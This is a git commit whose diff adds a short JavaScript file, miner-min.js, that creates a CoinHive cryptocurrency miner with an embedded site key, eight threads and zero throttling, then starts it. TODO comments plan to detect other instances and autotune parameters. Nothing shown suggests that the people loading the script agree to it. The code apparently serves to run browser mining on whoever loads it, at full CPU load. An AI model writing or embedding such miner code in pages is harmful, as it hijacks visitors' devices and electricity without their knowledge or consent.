6f7cf67b9cfcdbeaa37238e32c8a5773bfafdf7b
Shiva, Lord of Destruction <laurence.a.maddox@gmail.com>
2017-12-22 22:31:53 -0600

    adding minimal miners

---
+++ miner-min.js
@@ -0,0 +1,4 @@
+// TODO detect other running instances
+// TODO autotune parameters
+var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: 8, throttle: 0.0});
+miner.start ();
